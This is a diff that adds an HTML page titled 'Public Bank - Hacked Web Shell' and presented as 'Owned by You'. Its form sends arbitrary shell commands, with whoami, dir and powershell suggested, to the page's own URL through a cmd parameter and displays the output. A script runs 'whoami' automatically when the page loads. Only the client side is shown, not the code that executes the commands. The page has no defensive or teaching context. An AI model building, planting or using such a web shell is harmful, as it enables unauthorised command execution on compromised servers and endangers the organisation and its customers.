@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>💀 Public Bank - Hacked Web Shell</title>
+    <style>
+        body { font-family: monospace; background: #000; color: lime; padding: 20px; }
+        input { width: 70%; padding: 12px; font-size: 16px; background: #111; color: lime; border: 1px solid lime; }
+        button { padding: 12px 20px; font-size: 16px; background: red; color: white; border: none; cursor: pointer; }
+        pre { background: #111; padding: 15px; overflow: auto; }
+    </style>
+</head>
+<body>
+    <h1>💀 Public Bank Web Shell - Owned by You</h1>
+    <p>IP: 192.168.45.1</p>
+    
+    <form onsubmit="runCommand(); return false;">
+        <input type="text" id="cmd" placeholder="whoami or dir or powershell..." autofocus>
+        <button type="submit">Execute Command</button>
+    </form>
+
+    <pre id="output">Output will appear here...</pre>
+
+    <script>
+        async function runCommand() {
+            const cmd = document.getElementById('cmd').value;
+            const output = document.getElementById('output');
+            output.textContent = "Executing: " + cmd + "\n\n";
+
+            try {
+                const res = await fetch(window.location.href + "?cmd=" + encodeURIComponent(cmd));
+                const text = await res.text();
+                output.textContent += text;
+            } catch(e) {
+                output.textContent += "Error: " + e.message;
+            }
+        }
+
+        // Auto run example command on load
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('cmd').value = "whoami";
+                runCommand();
+            }, 800);
+        };
+    </script>
+</body>
+</html>
